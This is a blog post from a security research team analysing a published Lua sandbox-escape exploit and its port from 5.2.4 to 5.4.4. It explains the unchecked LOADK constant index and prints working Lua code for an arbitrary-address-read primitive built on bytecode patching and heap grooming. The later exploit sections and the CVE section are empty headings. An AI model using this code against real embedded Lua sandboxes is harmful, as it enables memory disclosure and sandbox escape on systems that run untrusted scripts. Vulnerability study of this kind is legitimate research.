---
title: "3. Previous Vulnerabilites"
categories:
  - Uncategorized
tags:
  - Lua
---
We started our security research on Lua by analyzing1-day vulnerabilites. Case studying previous vulnerabilites may be helpful to excavate new vulnerabilites. Specifically, we reviewed sandbox escape vulnerability in Lua v5.2, and previous CVEs related Lua.


# 1. Sandbox escape

The follwing is an analysis of the existing version of the sandbox escaping exploit code of 5.2.4 and applying it to 5.4.4. For modifications according to the version, see [lua-5.4.4-sandbox-escape](https://github.com/Lua-Project/lua-5.4.4-sandbox-escape), and for the existing 5.2.4 version of the exploit code, see [lua-5.2.4-sandbox-escape](https://github.com/erezto/lua-sandbox-escape).

## Contents
- Background
  - tostring
  - Bytecode
  - string.gsub
  - string.dump
- Root Cause
  - LOADK
  - CONSTANTS
- Exploit
  - AAR(Arbitary Address Read)
  - Fake object
  - Call frealloc
- Reference


## Background

### tostring

  If the metatable of the object that came over to the factor as one of the Lua function has `__tostring` as a key value, it is called as function. When an object with data types such as `function`, `table`, `userdata`, and `thread` that exist as built-in inside Lua, the address of the object is exposed as it is as follows.

  ```shell
  Lua 5.4.4  Copyright (C) 1994-2021 Lua.org, PUC-Rio
  > tostring(print)
  function: 0x564ebc5a0ab0
  > 
  ```

### Bytecode

  Lua is a register-based virtual machine. Bytecode is created and interpreted by parsing the code and executed. I'll explain it with an example.

  ```lua
  local function foo()
    local a="a" a="b" a="c" 
    return (#a)
  end

  foo()
  ```

  The `foo` function used in the code above is converted to the byte code below.

  `example of bytecode`
  ![image-center]({{ '/images/previous-vulnerabilities/bytecode1.png' | absolute_url }}){: .align-center}

  This converted byte code is interpreted and executed inside Lua.

### string.gsub

  This function is used to replace some of the strings with other strings. Briefly explaining the operation of the function, it returns a value obtained by replacing the string entered as the first argument with the remaining arguments. For more information, please refer to [string.gsub](http://www.lua.org/manual/5.4/manual.html#pdf-string.gsub).

### string.dump

  Returns a string expressed as a binary chunk of the function passed as an argument. In this case, the binary chunk is the bytecode. After that, you can use it by putting the returned string in the `load` function. For more information, please refer to [string.dump](http://www.lua.org/manual/5.4/manual.html#pdf-string.dump).

## Root cause

### LOADK

  Each bytecode used in Lua occupies 4bytes. Among them, in the case of the LOADK instruction, it has iABx among the follwing instruction formats.

  ![image-center]({{ '/images/previous-vulnerabilities/loadk1.png' | absolute_url }}){: .align-center}

  Also, LOADK has the follwing format.

  ![image-center]({{ '/images/previous-vulnerabilities/loadk2.png' | absolute_url }}){: .align-center}

  where R(A) represents the numbering of the virtual register used in the bytecode. A register corresponding to each number exists (e.g. R(1), R(2), ...) and an operation is performed using it as a variable.

  In addition, in the case of Bx, it means the index of CONSTANTS, which will be explained in detail later. (Specifies the number of variables in the CONSTANTS array.)

  When you see the code that actually runs the LOADK,

  ```c
  vmcase(OP_LOADK) {
        TValue *rb = k + GETARG_Bx(i);
        setobj2s(L, ra, rb);
        vmbreak;
      }
  ```

  The part where the vulnerability occurs is that there is no verification process for the Bx just described. For this reason, if an attacker finds out the address of the CONSTANTS and the offset between the address where the desired value is located and the address of the CONSTANTS, the desired value can be loaded into the desired virtual register.

### CONSTANTS

  CONSTANTS is a space to store variables necessary for function operation, such as function names and strings used in lua bytecode.

  ```c
  static void loadConstants (LoadState *S, Proto *f) {
    int i;
    int n = loadInt(S);
    f->k = luaM_newvectorchecked(S->L, n, TValue);
    f->sizek = n;
  
    /* skipped */

  }
  ```

  CONSTANTS actually used in the code is being used as variable k in the `luaV_execute` function. The variable is allocated space in the above `loadConstants`, and the heap chunk is finally allocated by malloc.

  As mentioned above, the attacker must know the address of CONSTANTS to load the desired value. To solve this, the collectgarbage function is used to induce the attacker to allocate the desired chunk to CONSTANTS.

  The details will be explained in the AAR section.


## Exploit

### AAR(Arbitary Address Read)

  ```lua
  local function _objAddr(o)
    return tonumber(tostring(o):match('^%a+: 0x(%x+)$'),16)
  end

  local function readAddr(addr)
    collectgarbage()

    local function foo()
        local a="a" a="b" a="c" 
        return (#a)
    end

    local _k={}
    local _str={}
    if (tostring(_k)>tostring(_str)) then
        local _t = _str
        _str = _k
        _k = _t
    end
    local _intermid={}
    local _str_addr = _objAddr(_str)

    local _addr = numTo64L(addr - 16)
    local padding_a = string.rep('\65', 8) -- 0x41 padding
    local padding_b = string.rep('\20', 15) -- LUA_VLNGSTR tag padding

    collectgarbage()
    _str = nil
    _intermid=nil
    collectgarbage()
    
    _str = padding_a .. _addr .. padding_b;
    

    foo = string.dump(foo)
    foo = foo:gsub(escapeString(createLOADK(0,2)),
        escapeString(createLOADK(0, (_str_addr+0x20 - _objAddr(_k))/16 ))) 
    _intermid = {}

    collectgarbage()
    _intermid = nil
    _k=nil
    collectgarbage()

    foo = load(foo)
    return foo()
  end


  local function objAddr(o)
    local known_objects = {}
    known_objects['thread'] = 1; known_objects['function']=1; known_objects['userdata']=1; known_objects['table'] = 1;
    local tp = type(o)
    if (known_objects[tp]) then return _objAddr(o) end

    local f = function(a) coroutine.yield(a) end
    local t = coroutine.create(f)
    local top = readAddr(_objAddr(t) + 0x10) 

    coroutine.resume(t, o)
    local addr = readAddr(top)

    return addr
  end

  local function bufferAddress(b)
    return (objAddr(b) + 0x18)
  end
  ```

  The code above is the part that does AAR. Before explaining the `readAddr` function used in AAR, let's first explain about `OP_LEN`, one of the bytecode commands.

  If you use `#` that returns the length of an object in the lua code, `OP_LEN` is used internally in the bytecode.

  ![image-center]({{ '/images/previous-vulnerabilities/AAR1.png' | absolute_url }}){: .align-center}

  The format of the `OP_LEN` bytecode is as above, and looking at the actual code

  ```c
  vmcase(OP_LEN) {
    Protect(luaV_objlen(L, ra, vRB(i)));
    vmbreak;
  }
  ```

  You can see that it calls the `luaV_objlen` function internally. Looking at this

  ```cpp
  /*
  ** Main operation 'ra = #rb'.
  */
  void luaV_objlen (lua_State *L, StkId ra, const TValue *rb) {
    const TValue *tm;
    switch (ttypetag(rb)) {
      /* skipped */
      case LUA_VSHRSTR: {
        setivalue(s2v(ra), tsvalue(rb)->shrlen);
        return;
      }
      case LUA_VLNGSTR: {
        setivalue(s2v(ra), tsvalue(rb)->u.lnglen);
        return;
      }
      /* skipped */
  }

  /*
  ** Header for a string value.
  */
  typedef struct TString {
    CommonHeader;
    lu_byte extra;  /* reserved words for short strings; "has hash" for longs */
    lu_byte shrlen;  /* length for short strings */
    unsigned int hash;
    union {
      size_t lnglen;  /* length for long strings */
      struct TString *hnext;  /* linked list for hash table */
    } u;
    char contents[1];
  } TString;
  ```

  If you look inside the `luaV_objlen` function, it checks the typetag of the `rb` value passed as an argument, and returns `shrlen` in case of `LUA_VSHRSTR` and `lnglen` in case of `LUA_VLNGSTR`.

  Now let's go back to the AAR code and take a look at the `readAddr` function.

  When the `foo` function used in the first part is converted into byte code, it is converted as shown in `example of bytecode`. It can be seen that the converted bytecode uses `LOADK`. As mentioned above, it uses `OP_LEN` to find out by substituting a desired address instead of a string using the vulnerability of LOADK.



### Fake object


### Call frealloc

## Exploit flow schematic

![image-center]({{ '/images/previous-vulnerabilities/exploit_flow1.jpeg' | absolute_url }}){: .align-center}
</br>

![image-center]({{ '/images/previous-vulnerabilities/exploit_flow2.jpeg' | absolute_url }}){: .align-center}
</br>

![image-center]({{ '/images/previous-vulnerabilities/exploit_flow3.jpeg' | absolute_url }}){: .align-center}


## Reference

[lua-5.2.4-sandbox-escape](https://github.com/erezto/lua-sandbox-escape)

[lua-5.4.4-sandbox-escape](https://github.com/Lua-Project/lua-5.4.4-sandbox-escape)




# 2. CVEs related to Lua

